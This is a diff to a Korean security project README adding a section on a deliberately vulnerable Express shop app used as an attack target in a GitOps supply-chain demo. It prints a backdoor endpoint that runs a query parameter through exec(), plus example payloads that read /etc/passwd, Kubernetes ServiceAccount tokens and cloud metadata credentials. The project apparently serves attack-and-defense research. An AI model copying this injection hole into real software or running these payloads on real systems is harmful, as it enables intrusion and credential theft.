@@ -54,6 +54,43 @@ npm 타이포스쿼팅, GitLab 계정 탈취 등으로 오염된 코드가 GitOp
 
 ---
 
+## 🛒 취약 애플리케이션 — K-Shield Shop
+
+> 공급망 공격 및 런타임 위협 시나리오 검증을 위해 **의도적으로 취약점을 포함한 쇼핑몰 애플리케이션**을 직접 제작하여 공격 대상(Target)으로 활용하였습니다.
+
+![K-Shield Shop 메인 화면](./docs/images/kshield-shop-main.png)
+
+### 애플리케이션 개요
+
+| 항목 | 내용 |
+|------|------|
+| **애플리케이션명** | K-Shield Shop |
+| **기술 스택** | Node.js / Express |
+| **배포 방식** | GitOps (Argo CD 자동 배포) |
+| **역할** | 공급망 공격 및 런타임 공격의 실제 타깃 환경 |
+
+### ⚠️ 삽입된 취약점 (백도어 엔드포인트)
+
+공격자가 오염된 이미지(`v1.0.8`)를 GitOps 파이프라인에 주입할 때, 아래의 **숨겨진 백도어 엔드포인트**가 함께 삽입되도록 설계하였습니다.
+
+```javascript
+app.get('/api/internal/metrics', (req, res) => {
+  const cmd = req.query.check;
+  exec(cmd, (err, stdout) => {
+    res.send(stdout);
+  });
+});
+```
+
+| 공격 유형 | 요청 예시 | 설명 |
+|-----------|-----------|------|
+| **RCE** | `?check=id` | 컨테이너 내 임의 명령 실행 |
+| **민감 파일 접근** | `?check=cat /etc/passwd` | 시스템 자격증명 파일 열람 |
+| **SA 토큰 탈취** | `?check=cat /var/run/secrets/...` | Kubernetes ServiceAccount 토큰 접근 |
+| **IMDS 접근** | `?check=curl 169.254.169.254/...` | 클라우드 자격증명 탈취 시도 |
+
+---
+
 ## ⚔️ 공격 시나리오
 
 ### 시나리오 1 — 공급망 오염 기반 Initial Access
